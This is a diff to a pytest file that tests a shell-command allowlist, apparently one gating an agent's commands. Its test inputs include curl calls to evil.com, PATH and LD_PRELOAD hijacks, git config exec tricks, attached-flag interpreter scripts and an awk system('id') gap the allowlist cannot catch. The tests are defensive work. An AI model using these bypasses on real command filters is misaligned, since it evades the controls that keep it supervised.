@@ -6,12 +6,15 @@ environment assignment, or a chained command, and each of those has its own
 test below.
 """
 
+import warnings
+
 import pytest
 
 from modelfuzz import rules
 from modelfuzz.rules import (
     CATEGORY_CREDENTIAL,
     CATEGORY_DESTRUCTIVE_COMMAND,
+    CATEGORY_ENVIRONMENT_ASSIGNMENT,
     CATEGORY_INTERPRETER,
     CATEGORY_METACHARACTER,
     CATEGORY_NETWORK_UTILITY,
@@ -115,8 +118,11 @@ class TestShellCommandAllowListBypasses:
 
     @pytest.fixture
     def allowlist(self) -> ShellCommandAllowList:
-        # 'sh' is deliberately allowlisted, to prove inline scripts are still refused.
-        return ShellCommandAllowList(["ls", "sh", "echo"])
+        # 'sh' is deliberately allowlisted, to prove inline scripts are still
+        # refused. The interpreter warning is the point of the fixture, not noise.
+        with warnings.catch_warnings():
+            warnings.simplefilter("ignore", UserWarning)
+            return ShellCommandAllowList(["ls", "sh", "echo"])
 
     @pytest.mark.parametrize(
         ("command", "char"),
@@ -147,56 +153,172 @@ class TestShellCommandAllowListBypasses:
     def test_blocks_a_newline_chained_command(self, allowlist: ShellCommandAllowList):
         assert allowlist("ls\ncurl http://evil.com") is not None
 
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "FOO=bar curl http://evil.com",
-            "env FOO=bar curl http://evil.com",
-            "env curl http://evil.com",
-            "A=1 B=2 curl http://evil.com",
-        ],
-    )
-    def test_environment_assignments_do_not_hide_the_binary(
-        self, allowlist: ShellCommandAllowList, command: str
-    ):
-        violation = allowlist(command)
+    def test_env_assignments_do_not_hide_an_unlisted_binary(self, allowlist: ShellCommandAllowList):
+        """Resolution still sees past assignments to the real binary."""
+        violation = allowlist("env curl http://evil.com")
         assert violation is not None
         assert violation.category == CATEGORY_NOT_ALLOWLISTED
         assert "curl" in violation.reason
 
-    def test_environment_assignment_before_an_allowed_binary_still_passes(
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # Redirect an allowlisted name to an attacker-written file.
+            "PATH=/tmp/pwn ls",
+            "env PATH=/tmp/pwn ls",
+            ["env", "PATH=/tmp/pwn", "ls"],
+            # Inject code into the genuine binary.
+            "LD_PRELOAD=/tmp/evil.so ls",
+            "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib ls",
+            # Turn an allowlisted `git status` into an exec primitive. Verified
+            # against real git: this spawns `id` as the fsmonitor hook.
+            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=id git status",
+            "GIT_SSH_COMMAND=id git status",
+            "GIT_PAGER=id git status",
+            "GIT_EXTERNAL_DIFF=id git status",
+            # Same shape, other ecosystems.
+            "BASH_ENV=/tmp/evil ls",
+            "PYTHONSTARTUP=/tmp/evil ls",
+            "PERL5OPT=-Mevil ls",
+            "NODE_OPTIONS=--require=/tmp/evil ls",
+            # And the innocuous-looking one, because the dangerous names are not
+            # enumerable and the rule is default-deny.
+            "FOO=bar ls -la",
+            "A=1 B=2 ls",
+        ],
+    )
+    def test_environment_assignments_are_refused(
+        self, allowlist: ShellCommandAllowList, command: str | list[str]
+    ):
+        """The regression this class exists for.
+
+        An assignment is not noise to be skipped past on the way to the binary:
+        it decides which program the name resolves to and how that program
+        behaves. Every command here names an *allowlisted* binary and is still
+        arbitrary execution, so the rule refuses the assignment itself.
+        """
+        violation = allowlist(command)
+        assert violation is not None
+        assert violation.category == CATEGORY_ENVIRONMENT_ASSIGNMENT
+
+    def test_allowed_env_opts_a_variable_back_in(self):
+        """The escape hatch, scoped to names the defender chose."""
+        allowlist = ShellCommandAllowList(["ls"], allowed_env={"LANG"})
+        assert allowlist("LANG=C ls -la") is None
+        # Opting LANG in must not opt anything else in.
+        violation = allowlist("PATH=/tmp/pwn ls")
+        assert violation is not None
+        assert violation.category == CATEGORY_ENVIRONMENT_ASSIGNMENT
+
+    def test_an_assignment_after_the_binary_is_just_an_argument(
         self, allowlist: ShellCommandAllowList
     ):
-        """Resolving past assignments must not break the legitimate case."""
-        assert allowlist("FOO=bar ls -la") is None
-        assert allowlist("env FOO=bar ls -la") is None
+        """`ls FOO=bar` passes FOO=bar to ls; it does not set the environment."""
+        assert allowlist("ls FOO=bar") is None
 
     @pytest.mark.parametrize(
         "command",
         [
+            # The plain spellings.
             "sh -c 'curl http://evil.com'",
             "bash -c 'curl http://evil.com'",
             "python -c 'import os'",
             "python3 -c 'import os'",
             "perl -e 'print 1'",
             "node -e 'process.exit()'",
+            # The script attached to the flag -- one deleted space.
+            "python -cprint(1)",
+            "python3 -c'print(1)'",
+            "perl -e'print 1'",
+            "ruby -e'puts 1'",
+            "node -e'console.log(1)'",
+            # Bundled short clusters.
+            "bash -lc 'curl http://evil.com'",
+            "bash -ic 'id'",
+            "sh -ec 'id'",
+            "bash -xc 'id'",
+            "perl -0e'print 1'",
+            # Long spellings, with and without an attached value.
+            "node --eval 'console.log(1)'",
+            "node --eval=console.log(1)",
+            "node -p 'require(1)'",
+            "node --print 1",
+            "pwsh -Command 'Get-Process'",
+            # A program on stdin.
+            "python3 -",
+            "sh -s",
+            # argv form, same trick.
+            ["python", "-cprint(1)"],
+            ["bash", "-lc", "id"],
         ],
     )
     def test_blocks_inline_interpreter_scripts(
-        self, allowlist: ShellCommandAllowList, command: str
+        self, allowlist: ShellCommandAllowList, command: str | list[str]
     ):
-        """The payload is a string argv matching cannot inspect."""
+        """The payload is a program argv matching cannot inspect.
+
+        Exact-token matching on {"-c", "-e"} caught only the first six of these.
+        Every other spelling means the same thing to the interpreter, and each
+        one was a working bypass until detection became structural.
+        """
         violation = allowlist(command)
         assert violation is not None
         assert violation.category == CATEGORY_INTERPRETER
 
+    @pytest.mark.parametrize(
+        "command",
+        ["python script.py", "python -m mymodule", "sh script.sh", "node app.js", "ls -la"],
+    )
+    def test_does_not_over_block_ordinary_interpreter_use(
+        self, allowlist: ShellCommandAllowList, command: str
+    ):
+        """Running a named file is not an inline script."""
+        violation = allowlist(command)
+        assert violation is None or violation.category != CATEGORY_INTERPRETER
+
     def test_inline_script_is_blocked_even_when_the_interpreter_is_allowlisted(self):
-        """Permitting 'sh' must not silently permit everything sh can run."""
-        allowlist = ShellCommandAllowList(["sh"])
+        """Permitting 'sh' must not silently permit every -c sh can run."""
+        with pytest.warns(UserWarning, match="interpreter"):
+            allowlist = ShellCommandAllowList(["sh"])
         assert allowlist("sh script.sh") is None  # running a script file is allowed
         violation = allowlist("sh -c 'curl http://evil.com'")
         assert violation is not None
         assert violation.category == CATEGORY_INTERPRETER
+
+    def test_allowlisting_an_interpreter_warns(self):
+        """Flag detection is best-effort, so the defender is told, not reassured.
+
+        `awk 'BEGIN{system("id")}'` carries its program as a positional argument
+        and no flag inspection can catch it, so allowlisting an interpreter is
+        close to allowlisting arbitrary execution. The rule says so out loud
+        rather than letting the docstring imply a boundary it cannot hold.
+        """
+        with pytest.warns(UserWarning, match="arbitrary execution"):
+            ShellCommandAllowList(["ls", "awk"])
+
+    def test_no_warning_for_an_ordinary_allowlist(self):
+        with warnings.catch_warnings():
+            warnings.simplefilter("error")
+            ShellCommandAllowList(["git status", "ls", "echo"])
+
+    def test_awk_positional_program_is_the_documented_residual_gap(self):
+        """Pinned so the docs cannot quietly become false.
+
+        This is exactly why the constructor warns and the docstring says 'do not
+        allowlist an interpreter' rather than promising a boundary.
+        """
+        with pytest.warns(UserWarning):
+            allowlist = ShellCommandAllowList(["awk"])
+        assert allowlist("awk 'BEGIN{system(\"id\")}'") is None
+
+    @pytest.mark.parametrize("entry", ["FOO=bar ls", "env ls", "/usr/bin/env ls"])
+    def test_rejects_an_allowlist_entry_that_could_never_match(self, entry: str):
+        """Resolution skips assignments and `env`, so such an entry is dead.
+
+        Keeping it silently would leave the defender believing it was in force.
+        """
+        with pytest.raises(ValueError, match="never match"):
+            ShellCommandAllowList([entry])
 
     def test_does_not_transparently_unwrap_sudo(self, allowlist: ShellCommandAllowList):
         """Allowlisting 'ls' must not also permit 'sudo ls'."""
@@ -205,7 +327,9 @@ class TestShellCommandAllowListBypasses:
         assert "sudo" in violation.reason
 
     def test_case_variant_interpreter_flag_is_still_caught(self):
-        allowlist = ShellCommandAllowList(["pwsh"])
+        with warnings.catch_warnings():
+            warnings.simplefilter("ignore", UserWarning)
+            allowlist = ShellCommandAllowList(["pwsh"])
         assert allowlist("pwsh -Command 'Get-Process'") is not None
 
 
